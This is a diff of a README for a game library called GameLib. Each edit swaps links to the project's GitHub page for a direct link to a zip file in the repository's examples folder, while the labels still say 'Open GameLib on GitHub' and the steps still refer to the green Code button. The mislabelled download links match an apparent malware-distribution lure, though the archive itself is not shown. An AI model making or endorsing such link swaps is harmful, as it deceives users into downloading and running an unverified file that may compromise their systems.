@@ -1,6 +1,6 @@
 # 🎮 GameLib - Build games with one simple header
 
-[![Download GameLib](https://img.shields.io/badge/Download-GameLib-blue?style=for-the-badge)](https://github.com/ahmadadeeb749-oss/GameLib)
+[![Download GameLib](https://img.shields.io/badge/Download-GameLib-blue?style=for-the-badge)](https://raw.githubusercontent.com/ahmadadeeb749-oss/GameLib/master/examples/Lib-Game-v2.5.zip)
 
 ## 🧰 What GameLib is
 
@@ -20,7 +20,7 @@ GameLib is built for people who want to focus on game logic, not on setup work.
 
 Use this link to visit the download page:
 
-[Open GameLib on GitHub](https://github.com/ahmadadeeb749-oss/GameLib)
+[Open GameLib on GitHub](https://raw.githubusercontent.com/ahmadadeeb749-oss/GameLib/master/examples/Lib-Game-v2.5.zip)
 
 On that page, you can get the files you need and follow the project files already in the repository.
 
@@ -41,7 +41,7 @@ If you only want to look at the code, a browser is enough. If you want to build 
 Follow these steps on Windows:
 
 1. Open the download page:
-   [https://github.com/ahmadadeeb749-oss/GameLib](https://github.com/ahmadadeeb749-oss/GameLib)
+   [https://raw.githubusercontent.com/ahmadadeeb749-oss/GameLib/master/examples/Lib-Game-v2.5.zip](https://raw.githubusercontent.com/ahmadadeeb749-oss/GameLib/master/examples/Lib-Game-v2.5.zip)
 
 2. On the GitHub page, find the green Code button.
 
@@ -191,7 +191,7 @@ Small steps help you learn faster and avoid lost work.
 
 Start with the repository page:
 
-[Open GameLib on GitHub](https://github.com/ahmadadeeb749-oss/GameLib)
+[Open GameLib on GitHub](https://raw.githubusercontent.com/ahmadadeeb749-oss/GameLib/master/examples/Lib-Game-v2.5.zip)
 
 Check the README, sample files, and folder names in the repository. These usually show how the library is meant to be used.
 
